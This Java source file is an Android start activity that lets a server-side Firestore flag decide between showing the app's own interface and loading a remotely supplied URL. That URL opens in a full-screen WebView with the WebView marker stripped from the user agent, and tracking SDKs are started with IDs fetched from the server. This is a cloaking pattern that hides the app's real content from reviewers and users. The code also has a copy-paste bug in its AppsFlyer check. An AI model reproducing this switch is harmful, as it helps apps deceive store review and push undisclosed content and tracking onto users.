package com.traffbooster.car.core;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.widget.FrameLayout;
import androidx.annotation.LayoutRes;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.appsflyer.AppsFlyerLib;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.kochava.base.Tracker;
import com.onesignal.OneSignal;
import com.traffbooster.car.R;
import java.security.MessageDigest;
import im.delight.android.webview.AdvancedWebView;
import static com.traffbooster.car.core.Constants.FIREBASE_APP;
import static com.traffbooster.car.core.Constants.FIREBASE_APPSFLYER;
import static com.traffbooster.car.core.Constants.FIREBASE_DATA;
import static com.traffbooster.car.core.Constants.FIREBASE_KOCHAVA;
import static com.traffbooster.car.core.Constants.FIREBASE_ONE_SIGNAL;
import static com.traffbooster.car.core.Constants.FIREBASE_SHOW_PLACEHOLDER;
import static com.traffbooster.car.core.Constants.FIREBASE_URL;
import static com.traffbooster.car.core.Constants.PREFS;
import static com.traffbooster.car.core.Constants.PREFS_LAST_URL;

public abstract class StartActivity extends AppCompatActivity {

    private AdvancedWebView webView;
    private FrameLayout loadingView;
    private boolean showWebView = false;
    private SharedPreferences prefs;

    protected abstract void onShowAppUi();
    protected abstract @LayoutRes int getLoadingViewLayoutRes();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setTheme(R.style.AppThemeWebView);
        setContentView(R.layout.activity_webview);

        prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE);

        initStatusBar();
        initViews();
        initData();
    }

    private void initStatusBar() {
        View decorView = getWindow().getDecorView();
        int uiOptions = View.SYSTEM_UI_FLAG_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY;
        decorView.setSystemUiVisibility(uiOptions);
    }

    private void initViews() {
        webView = findViewById(R.id.webView);
        webView.setListener(this, new AdvancedWebView.Listener() {
            @Override
            public void onPageStarted(String url, Bitmap favicon) {
                Log.d("onPageStarted", url);
                if(showWebView) {
                    webView.setVisibility(View.VISIBLE);
                    loadingView.setVisibility(View.GONE);
                }
            }
            @Override
            public void onPageFinished(String url) {
                CookieManager.getInstance().flush();
                prefs.edit().putString(PREFS_LAST_URL, url).apply();
            }
            @Override public void onPageError(int errorCode, String description, String failingUrl) { }
            @Override public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) { }
            @Override public void onExternalPageRequest(String url) { }
        });
        webView.setWebChromeClient(new ChromeClient());
        webView.getSettings().setDomStorageEnabled(true);
        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);

        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.getSettings().setLoadWithOverviewMode(false);
        webView.getSettings().setUserAgentString(webView.getSettings().getUserAgentString().replace("; wv", ""));

        loadingView = findViewById(R.id.progress);
        View.inflate(getApplicationContext(), getLoadingViewLayoutRes(), loadingView);
    }

    private void initData() {
        if (isNetworkConnected()) {
            checkStatus(new ISuccessListener() {
                @Override
                public void success() {
                    showAds();
                }
                @Override
                public void failed() {
                    showAppUI();
                }
            });
        }
        else showAppUI();
    }

    private void initKochava(String id) {
        Tracker.configure(new Tracker.Configuration(getApplicationContext())
                .setAppGuid(id));
    }

    private void initOneSignal(String id) {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.initWithContext(this);
        OneSignal.setAppId(id);
    }

    private void initAppsFlyer(String id) {
        AppsFlyerLib.getInstance().init(id, null, this);
        AppsFlyerLib.getInstance().start(this);
    }

    private void showAds() {
        String lastUrl = prefs.getString(PREFS_LAST_URL, null);
        if(!TextUtils.isEmpty(lastUrl)) loadUrl(lastUrl);
        else downloadUrl(new IResultListener() {
            @Override
            public void success(String result) {
                loadUrl(result);
            }
            @Override
            public void failed() {
                showAppUI();
            }
        });
    }

    private void loadUrl(String url) {
        webView.post(() -> {
            showWebView = true;
            webView.loadUrl(url);
        });
    }

    private void showAppUI() {
        finish();
        onShowAppUi();
    }

    private void checkStatus(ISuccessListener listener) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        DocumentReference docRef = db.collection(FIREBASE_DATA).document(FIREBASE_APP);
        docRef.get().addOnCompleteListener(task -> {
            if(task.isSuccessful()) {
                DocumentSnapshot document = task.getResult();
                if (document != null
                        && document.exists()
                        && document.getData() != null
                        && document.getData().get(FIREBASE_SHOW_PLACEHOLDER) != null) {

                    Boolean show = (Boolean) document.getData().get(FIREBASE_SHOW_PLACEHOLDER);
                    if(show != null && !show) listener.success();
                    else listener.failed();
                }
                else listener.failed();
            }
            else listener.failed();
        }).addOnFailureListener(e -> listener.failed());
    }

    private void downloadUrl(IResultListener listener) {
        FirebaseFirestore db = FirebaseFirestore.getInstance();
        DocumentReference docRef = db.collection(FIREBASE_DATA).document(FIREBASE_APP);
        docRef.get().addOnCompleteListener(task -> {
            if(task.isSuccessful()) {
                DocumentSnapshot document = task.getResult();
                if(document != null
                        && document.exists()
                        && document.getData() != null
                        && document.getData().get(FIREBASE_URL) != null) {

                    String url = document.getData().get(FIREBASE_URL).toString();
                    if(!TextUtils.isEmpty(url)) {
                        if(document.getData().get(FIREBASE_ONE_SIGNAL) != null) {
                            String oneSignalId = document.getData().get(FIREBASE_ONE_SIGNAL).toString();
                            initOneSignal(oneSignalId);
                        }
                        if(document.getData().get(FIREBASE_KOCHAVA) != null) {
                            String kochavaId = document.getData().get(FIREBASE_KOCHAVA).toString();
                            initKochava(kochavaId);
                        }
                        if(document.getData().get(FIREBASE_KOCHAVA) != null) {
                            String appsflyerId = document.getData().get(FIREBASE_APPSFLYER).toString();
                            initAppsFlyer(appsflyerId);
                        }
                        listener.success(url);
                    }
                    else listener.failed();
                }
                else listener.failed();
            }
            else listener.failed();
        }).addOnFailureListener(e -> listener.failed());
    }

    @SuppressLint("MissingPermission")
    private boolean isNetworkConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        return cm.getActiveNetworkInfo() != null && cm.getActiveNetworkInfo().isConnected();
    }

    public class ChromeClient extends WebChromeClient {

        private View mCustomView;
        private CustomViewCallback mCustomViewCallback;
        private int mOriginalOrientation;
        private int mOriginalSystemUiVisibility;

        public Bitmap getDefaultVideoPoster() {
            if (mCustomView == null) return null;
            return BitmapFactory.decodeResource(getApplicationContext().getResources(), 2130837573);
        }

        public void onHideCustomView() {
            ((FrameLayout) getWindow().getDecorView()).removeView(this.mCustomView);
            this.mCustomView = null;
            getWindow().getDecorView().setSystemUiVisibility(this.mOriginalSystemUiVisibility);
            setRequestedOrientation(this.mOriginalOrientation);
            this.mCustomViewCallback.onCustomViewHidden();
            this.mCustomViewCallback = null;
        }

        public void onShowCustomView(View paramView, CustomViewCallback paramCustomViewCallback) {
            if (this.mCustomView != null) {
                onHideCustomView();
                return;
            }
            this.mCustomView = paramView;
            this.mOriginalSystemUiVisibility = getWindow().getDecorView().getSystemUiVisibility();
            this.mOriginalOrientation = getRequestedOrientation();
            this.mCustomViewCallback = paramCustomViewCallback;
            ((FrameLayout) getWindow().getDecorView()).addView(this.mCustomView, new FrameLayout.LayoutParams(-1, -1));
            getWindow().getDecorView().setSystemUiVisibility(3846 | View.SYSTEM_UI_FLAG_LAYOUT_STABLE);
        }
    }

    @Override
    public void onBackPressed() {
        if(webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onResume() {
        webView.onResume();
        super.onResume();
    }

    @Override
    protected void onPause() {
        webView.onPause();
        super.onPause();
    }

    @Override
    protected void onDestroy() {
        webView.onDestroy();
        super.onDestroy();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        webView.onActivityResult(requestCode, resultCode, data);
    }

    // HELPERS

    private void printFacebookKeyHash() {
        try {
            @SuppressLint("PackageManagerGetSignatures")
            PackageInfo info = getPackageManager().getPackageInfo(
                    getPackageName(),
                    PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());
                Log.d("KeyHash:", Base64.encodeToString(md.digest(), Base64.DEFAULT));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}